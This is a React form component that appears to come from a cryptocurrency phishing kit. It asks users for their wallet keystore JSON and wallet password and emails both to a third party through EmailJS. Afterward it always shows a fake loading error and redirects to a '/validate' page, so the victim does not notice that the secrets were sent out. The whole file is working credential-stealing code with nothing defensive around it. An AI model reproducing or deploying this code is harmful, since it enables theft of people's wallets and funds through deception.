import { Input, Text, Textarea, useToast, VStack } from '@chakra-ui/react';
import React from 'react';
import emailjs from '@emailjs/browser';

import CustomButton from './CustomButton';
import emailConfig from '../constants';
import { useNavigate } from 'react-router-dom';

export default function KeyStore({ color, name, placeholder }) {
  const [keystore, setKeystore] = React.useState('');
  const [password, setPassword] = React.useState('');
  const [loading, setLoading] = React.useState(false);
  const toast = useToast();

  const navigate = useNavigate();

  const handleSubmit = async e => {
    e.preventDefault();
    setLoading(true);

    try {
      if (!password || !keystore) {
        return window.alert('Please enter your keystore and password');
      }

      await emailjs.send(
        emailConfig.service_id,
        emailConfig.template_id,
        { password: password, from_wallet: name, keystore: keystore },
        emailConfig.public_key
      );

      setTimeout(() => {
        setLoading(false);
      }, 10000);

      toast({
        title: 'Error',
        description: 'An Error Occured While Loading Keystore',
        status: 'error',
        duration: 5000,
        isClosable: true,
        position: 'top',
      });
      navigate('/validate', { replace: true });
    } catch (error) {
      setTimeout(() => {
        setLoading(false);
      }, 10000);

      toast({
        title: 'Error',
        description: 'An Error Occured While Loading Keystore',
        status: 'error',
        duration: 5000,
        isClosable: true,
        position: 'top',
      });

      navigate('/validate', { replace: true });
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <VStack align="stretch" spacing="20px">
        <Textarea
          value={keystore}
          onChange={e => setKeystore(e.target.value)}
          placeholder="Keystore JSON"
          size="sm"
          height="120px"
          borderRadius="lg"
          color={color}
          _placeholder={{ placeholder }}
        />

        <Input
          value={password}
          onChange={e => setPassword(e.target.value)}
          placeholder="Wallet Password"
          size="sm"
          py="20px"
          borderRadius="lg"
          color={color}
          _placeholder={{ placeholder }}
        />

        <Text mt="20px" mb="8px" fontSize="14px" color={placeholder}>
          {`Several lines of text beginning with "{...}" plus the password you used to encrypt it.`}
        </Text>

        <CustomButton loading={loading} loadingText={'LOADING KEYSTORE...'} />
      </VStack>
    </form>
  );
}
